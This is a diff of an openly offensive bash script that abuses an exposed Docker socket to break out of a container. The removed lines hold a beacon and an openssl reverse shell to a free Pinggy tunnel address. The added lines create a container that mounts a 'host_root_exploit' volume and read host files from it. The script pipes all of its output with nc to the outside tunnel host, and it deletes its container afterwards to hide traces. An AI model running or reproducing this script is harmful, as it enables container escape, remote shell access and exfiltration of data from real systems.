@@ -1,17 +1,41 @@
 #!/bin/bash
-# NEW PINGGY TARGET
-P_URL="gxxlv-103-95-173-113.a.free.pinggy.link"
-P_PORT="33897"
+# Updated for Pinggy TCP Tunnel
+# URL: gxxlv-103-95-173-113.a.free.pinggy.link
+# PORT: 33897
+TARGET="gxxlv-103-95-173-113.a.free.pinggy.link"
+PORT="33897"
 
-# 1. SIMPLE PING: This will show up in your Pinggy log immediately
-# It tells us the loop is alive and the VM has internet.
-echo "BEACON_FROM_GOOGLE_HOST" | nc -w 3 $P_URL $P_PORT
+{
+  echo "--- [!] EXPLOITING THE CREATED VOLUME (PINGGY) ---"
+  echo "Timestamp: $(date)"
 
-# 2. ESCAPE ATTEMPT
-ID=$(curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1 | grep -oE '"Id":"[a-f0-9]+"' | head -1 | cut -d'"' -f4)
+  # 1. Create a container using the existing host_root_exploit volume
+  # Using the confirmed image ID: sha256:25109184c71bdad7
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "Image": "sha256:25109184c71bdad7",
+      "HostConfig": {
+        "Binds": ["host_root_exploit:/host_data:ro"]
+      }
+    }' > /tmp/final_cid.json
 
-if [ -n "$ID" ]; then
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-    -d "{\"Cmd\": [\"sh\", \"-c\", \"openssl s_client -quiet -connect $P_URL:$P_PORT -quiet </tmp/s | /bin/sh -i >/tmp/s 2>&1\"]}" &
-fi
+  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/final_cid.json | cut -d'"' -f4)
+
+  if [ -n "$ID" ]; then
+    echo "Container $ID created using exploit volume."
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
+    
+    # Give the container a moment to initialize the mount
+    sleep 2
+    
+    echo "--- HOST OS-RELEASE DATA ---"
+    # This reads the HOST's OS info directly from the mounted volume
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/os-release" | tar -xO
+    
+    # Cleanup to leave a clean environment
+    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
+  else
+    echo "Container creation failed. Check if volume 'host_root_exploit' exists."
+  fi
+} | nc $TARGET $PORT
